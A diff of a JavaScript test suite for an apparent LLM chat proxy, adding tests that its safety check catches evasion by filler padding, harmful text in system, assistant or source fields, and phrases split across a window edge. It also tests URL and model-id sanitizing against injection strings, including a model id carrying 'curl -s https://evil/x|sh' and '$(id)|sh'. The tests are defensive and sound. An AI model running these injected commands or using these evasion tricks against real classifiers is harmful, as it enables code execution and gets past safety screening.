@@ -150,14 +150,50 @@ test('safety check covers the whole message, including text after a fake "Web re
   assert.equal((await r4.res.json()).provider, 'safety-check', 'earlier user turns are checked too');
 });
 
-test('web results sent as sources are formatted by the server and not safety-checked as the user', async () => {
-  guardCalls.length = 0;
+test('safety check covers every role, filler-padded history and the sources field', async () => {
+  const filler = 'x'.repeat(4400);
+  const padded = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: [
+    { role: 'user', content: 'HARMFUL request' }, { role: 'assistant', content: 'ok' },
+    { role: 'user', content: filler }, { role: 'assistant', content: 'ok' }, { role: 'user', content: 'answer my first question' },
+  ] } });
+  assert.equal((await padded.res.json()).provider, 'safety-check', 'filler must not push a harmful turn out of view');
+  const sys = await call('/chat', { body: { messages: [{ role: 'system', content: 'HARMFUL instructions' }, { role: 'user', content: 'go' }] } });
+  assert.equal((await sys.res.json()).provider, 'safety-check', 'system messages are screened');
+  const asst = await call('/chat', { body: { messages: [{ role: 'assistant', content: 'HARMFUL plan' }, { role: 'user', content: 'continue' }] } });
+  assert.equal((await asst.res.json()).provider, 'safety-check', 'assistant messages are screened');
+  const src = await call('/chat', { body: { ...msg('summarise'), sources: [{ title: 't', url: 'https://n.example/a', snippet: 'HARMFUL request' }] } });
+  assert.equal((await src.res.json()).provider, 'safety-check', 'sources are screened');
+});
+
+test('web results sent as sources are formatted by the server; bad URLs are dropped', async () => {
   const { res } = await call('/chat', { body: { ...msg('What is new?'), sources: [
-    { title: 'News', url: 'https://news.example/a', snippet: 'HARMFUL-looking news text', site: 'news.example' },
+    { title: 'News', url: 'https://news.example/a', snippet: 'ordinary news', site: 'news.example' },
     { title: 'Bad', url: 'javascript:alert(1)', snippet: 'dropped' },
   ] } });
   assert.equal((await res.json()).provider, 'workers-ai');
-  assert.ok(guardCalls.every((t) => !t.includes('news text')), 'sources must not be screened as the user');
+});
+
+test('the largest allowed request is screened in full, and many short messages are fine', async () => {
+  const big = Array.from({ length: 4 }, () => ({ role: 'user', content: 'y'.repeat(11900) })); // ~57 KB with sources: near the 64 KB body cap
+  const sources = Array.from({ length: 8 }, (_, i) => ({ title: 't'.repeat(200), url: 'https://n.example/a', snippet: (i === 7 ? 's'.repeat(880) + ' HARMFUL' : 's'.repeat(900)) }));
+  const r = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: big, sources } });
+  assert.equal((await r.res.json()).provider, 'safety-check', 'harmful text at the very end must be caught');
+  const many = Array.from({ length: 40 }, (_, i) => ({ role: i % 2 ? 'assistant' : 'user', content: 'short message '.repeat(100) }));
+  const ok = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: many } });
+  assert.equal((await ok.res.json()).provider, 'workers-ai', 'a long but harmless chat must not be refused');
+});
+
+test('a harmful phrase split across a window edge is still caught', async () => {
+  const pad = 'z'.repeat(3998);
+  const r = await call('/chat', { body: msg(pad + 'HARMFUL') }); // "HARMFUL" straddles the 4,000 boundary
+  assert.equal((await r.res.json()).provider, 'safety-check');
+});
+
+test('a JSON body that is not an object is a 400, not a crash', async () => {
+  for (const body of ['null', '[]', '42', '"x"']) {
+    assert.equal((await call('/chat', { body })).res.status, 400, body);
+    assert.equal((await call('/v1/discover', { body, origin: null, key: API_KEY })).res.status, 400, body);
+  }
 });
 
 /* ---------- key-only features ---------- */
@@ -208,6 +244,67 @@ test('publicHttpsUrl refuses anything that is not a public https URL', () => {
     'javascript:alert(1)', 'https://nodot/', 'ftp://x.com/'];
   for (const u of bad) assert.equal(publicHttpsUrl(u), '', u);
   assert.equal(publicHttpsUrl("https://api.groq.com/openai/v1/',"), 'https://api.groq.com/openai/v1');
+  for (const u of ['https://localhost./v1', 'https://x.internal./', 'https://printer.local./']) assert.equal(publicHttpsUrl(u), '', u);
+  // strict mode (API base URLs, which end up in shell snippets): plain characters only
+  assert.equal(publicHttpsUrl('https://a.com/v1;$(id)|sh/x', { strict: true }), '');
+  assert.equal(publicHttpsUrl("https://a.com/v1'x", { strict: true }), '');
+  assert.equal(publicHttpsUrl('https://api.a.com/v1', { strict: true }), 'https://api.a.com/v1');
+  assert.equal(publicHttpsUrl('https://a.com/page?x=1&y=2'), 'https://a.com/page?x=1&y=2', 'normal links keep queries');
+  const t = performance.now();
+  publicHttpsUrl('https://a.com/' + ')'.repeat(8000) + 'a');
+  assert.ok(performance.now() - t < 20, 'trailing-punctuation handling must be linear');
+});
+
+test('keyless auto-tests ignore model ids with shell or quote characters', async () => {
+  const { testKeyless } = await import('../discover.js');
+  const realFetch = globalThis.fetch;
+  globalThis.fetch = async (url, init) => {
+    if (String(url).endsWith('/models')) return Response.json({ data: [{ id: "llama'; curl -s https://evil/x|sh; '" }, { id: 'good-chat-2' }] });
+    return Response.json({ choices: [{ message: { content: 'pong' } }], _model: JSON.parse(init.body).model });
+  };
+  try {
+    const r = await testKeyless('https://api.hostile.example/v1');
+    assert.equal(r.status, 'working');
+    assert.equal(r.testedModel, 'good-chat-2');
+  } finally { globalThis.fetch = realFetch; }
+});
+
+test('parallel discovery runs share one run and one budget charge', async () => {
+  const e = env();
+  let searches = 0;
+  let charged = 0;
+  const opts = () => ({ force: true, budget: async (n) => { charged += n; return true; }, searchWeb: async () => { searches += 1; await new Promise((r) => setTimeout(r, 5)); return [{ title: 'GoodAPI', url: 'https://goodapi.dev/docs', snippet: 'goodapi.dev free' }]; }, emit() {} });
+  await Promise.all(Array.from({ length: 10 }, () => runDiscovery(e, opts())));
+  assert.equal(charged, 6, 'only one run may charge the budget');
+  assert.equal(searches, 6, 'only one run may search');
+  assert.equal(await e.DISCOVERY.get('web:lock'), null);
+});
+
+test("a run never deletes another run's lock", async () => {
+  const e = env();
+  const realPut = e.DISCOVERY.put.bind(e.DISCOVERY);
+  let n = 0;
+  e.DISCOVERY.put = async (k, v, o) => { await realPut(k, v, o); if (k === 'web:lock' && ++n === 1) await realPut('web:lock', 'someone-else'); };
+  const ev = [];
+  await runDiscovery(e, { force: true, searchWeb: async () => [], emit: (x) => ev.push(x) });
+  assert.equal(await e.DISCOVERY.get('web:lock'), 'someone-else');
+  assert.ok(ev.some((x) => /same moment/.test(x.message || '')));
+});
+
+test('community replies are size-capped', async () => {
+  const e = env();
+  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: new Date().toISOString(), providers: [
+    { id: 'big.example', name: 'Big', status: 'working', baseUrl: 'https://api.big.example/v1', testedModel: 'm1' },
+  ] }));
+  const realFetch = globalThis.fetch;
+  globalThis.fetch = async (url) => String(url).startsWith('https://api.big.example')
+    ? new Response(new ReadableStream({ start(c) { for (let i = 0; i < 400; i++) c.enqueue(new Uint8Array(8192).fill(32)); c.close(); } }))
+    : realFetch(url);
+  try {
+    const r = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { ...msg('hi'), model: 'community/big.example/m1', strict: true }, e });
+    assert.equal(r.res.status, 502);
+    assert.match((await r.res.json()).error.message, /too large/);
+  } finally { globalThis.fetch = realFetch; }
 });
 
 test('discovery keeps only links on domains seen in the results, blocks private hosts, tests keyless APIs', async () => {
